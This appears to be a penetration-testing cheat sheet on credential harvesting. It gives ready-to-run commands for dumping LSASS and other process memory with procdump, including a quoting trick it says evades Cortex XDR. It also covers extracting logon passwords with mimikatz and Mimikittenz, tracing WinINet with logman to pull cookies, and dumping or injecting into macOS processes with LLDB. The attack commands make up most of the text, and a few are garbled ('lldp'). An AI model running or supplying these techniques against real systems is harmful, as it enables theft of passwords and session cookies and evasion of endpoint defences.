# Credential harvesting
---
## Navigation
- **[[#Windows]]**
- **[[#Linux]]**
- **[[#MacOS]]**

---
# Windows 
 # 1- Process memory:
 ###### 1- Procdump.exe
 ```powershell
procdump.exe -accepteula -ma <PID> /temp/proc.dmp
 
#Additionally, depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):
procdump.exe -accepteula -ma “lsass.exe” out.dmp

 ```
To dump all processes:
```powershell
#make sure to install procdump from Systeinternals and have it in your path
Get-Process | % {procdump.exe -ma $_.Id }

gci *.dmp | % { strings.exe -n 17 $_.Name | Select-String "password=" | Out-File ($_.Name+".txt")}
```
> **Important Note:**
> It's recommended to dump a single process at a time for investigation because dumping all processes takes alot of time and could trigger detections especially when working with LSASS.
> 
> **Download:** https://download.sysinternals.com/files/SysinternalsSuite.zip

 ###### 2- Mimikittenz (Not working on windows 10)
 Rather than writing files to disk, Mimikittenz will read the memory of processes using the Win32 API  `ReadProcessMemory`  to search for a set of common credentials.  `Mimikittenz`  can easily be customized to search for additional regular expressions in process memory.
```powershell
Invoke-Mimikittenz
```
> **Download:** https://github.com/orlyjamie/mimikittenz

 ###### 3- mimikatz
 ```powershell
sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
 ```
 
 # 2-Abusing logging & tracing:
 For debugging and monitoring purposes, applications and services emit logs and traces. This enables ***privileged*** users on the machine to get more insights into the inner workings of an application during runtime. Windows has a powerful tracing infrastructure called **`Event Tracing for Windows (ETW)`**
 There are tools out of the box in Windows to interact with ETW, and they allow us to start traces, collect data, and stop them, such as **`wevtutil`** and **`logman`** .
-  **`logman`** : Allows us to manage event tracing sessions.
 Run the following command to see what providers are available:
 ```powershell
 logman query providers
 ```
 
###### 1- Tracing the WinINet provider
The Windows Internet (WinINet) application programming interface (API) enables your application to interact with FTP and HTTP protocols to access Internet resources. it also can be used to inspect TLS traffic.
1. **Launch a tracing session with logman as an Administrator:**
```powershell
logman start WinInetSession -p "Microsoft-Windows- WinInet" -o WinInetTraceSession.evt -ets
```
2. **Now tracing events are now written to the provided evt file**
3. **Searching event file to get some juicy info such as cookies:**
```powershell
# The following is just an example, consider knowing the cookie header for what you are interested in..
.\strings.exe -nobanner -n 8 .\WinInetTraceSession.evt | Select-String "Set-Cookie: "
```
4- If you'd like to view the binary file in Event Viewer, you can do that too. Just launch **`eventvwr.exe`** and open the file 

You can convert the event file into a text file:
```powershell
# Converting into text file
wevtutil qe WinInetTraceSession.evt /lf:True /f:Text > WinInetTrace.log
```
> **Important Note:**
> Microsoft Edge & Internet Explorer use this provider, so in case of other browsers, you will have to know their provider or another tracing technique.

---
# Linux
### Process memory:
###### 1- Procdump
```bash
# Download procdump
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update -y
sudo apt-get install procdump

# Dump a process
procdump -p <PID>
```
> **Important Note:**
> Dumping a root process requires a root privilege.

---
# MacOS
Apple made it more difficult to debug or dump process memory, even as root. Apple introduced a feature called **`System Integrity Protection (SIP)`** that limits what even the root user can do to the operating system.
```bash
# Check if SIP is enabled
csrutil status
```
If SIP is enabled, you cannot debug or inspect
these processes easily, even when running as root.
> **Important Note:**
>  SIP only protects certain folders and binaries (by default no third-party software), and ones that have proper signatures.
>  You can find protected files in: `/System/Library/Sandbox/rootless.conf`
>  or by executing the following command:
>  `ls -lhaO /Applications/ | grep -v restricted`

But the good news is that even if SIP is enabled, you can still debug certain processes using tools such as **`Low-Level Debugger (LLDB)`**. 
After finding a running process not covered by SIP, attach the LLDB debugger to it.
```bash
lldp -p <pid>
# Attach process
(lldp) process attach --pid <pid>
# Dump process memory
(lldp) process save-core
```
> You can inject code into memory by using this example:
> `(lldb) p (void) system("whoami &> /tmp/log.txt")`

